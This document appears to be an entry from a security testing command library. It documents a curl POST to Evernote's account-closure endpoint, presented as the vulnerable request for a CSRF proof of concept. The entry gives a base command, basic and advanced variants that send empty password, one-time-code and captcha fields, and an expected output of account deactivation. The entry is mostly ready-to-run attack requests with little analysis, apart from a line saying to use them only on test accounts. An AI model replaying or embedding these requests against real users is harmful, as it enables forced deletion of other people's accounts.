---
data: >-
  curl -X POST
  'https://www.evernote.com/secure/CloseAccount.action?accountAction=deactivateAccount&json=true'
  -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: [various
  session cookies]' -d
  'password=&oneTimeCode=&captchaResponse=&reasons[analytic]=specify-reason-different-app&reasons[i18nKey]=CloseAccountAction.accountActionSurvey.differentApp&reasons[checked]=true&otherReason='
tags:
  - http
  - post
  - csrf
  - evernote
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:27:57.094Z'
id: 3ed4bd04-cb41-4afe-9971-fb02be4d2cf7
verified: false
validated: true
submitted: true
---
# evernote-deactivate-post

## Command

```bash
curl -X POST 'https://www.evernote.com/secure/CloseAccount.action?accountAction=deactivateAccount&json=true' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Cookie: [various session cookies]' \
  -d 'password=&oneTimeCode=&captchaResponse=&reasons[analytic]=specify-reason-different-app&reasons[i18nKey]=CloseAccountAction.accountActionSurvey.differentApp&reasons[checked]=true&otherReason='
```

## Description

This curl command replicates the vulnerable POST request to deactivate an Evernote account, used in CSRF PoC testing. It sends form data with empty sensitive fields and a selected reason, relying on session cookies for authentication. Use only on test accounts to avoid real harm.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies HTTP POST method | Yes |
| URL params: `accountAction=deactivateAccount` | Action to perform | Yes |
| `json=true` | Requests JSON response | Yes |
| `-H 'Content-Type: ...'` | Sets form encoding | Yes |
| `-H 'Cookie: ...'` | Includes session for auth | Yes |
| `-d '...'` | Form data payload | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://www.evernote.com/secure/CloseAccount.action?accountAction=deactivateAccount&json=true' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: [session]' -d 'password=&oneTimeCode=&captchaResponse=&reasons[checked]=true'
```

### Advanced Usage

Add custom reason:

```bash
curl -X POST 'https://www.evernote.com/secure/CloseAccount.action?accountAction=deactivateAccount&json=true' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: [session]' -d 'password=&reasons[analytic]=other&otherReason=Test reason'
```

## Expected Output

JSON response confirming deactivation, e.g., {"status":"success","message":"Account deactivated"}. On failure, error JSON or HTTP 4xx/5xx. Account becomes inaccessible post-execution.

## Related

- [[Related Procedure: Analyze Captured POST Request]]
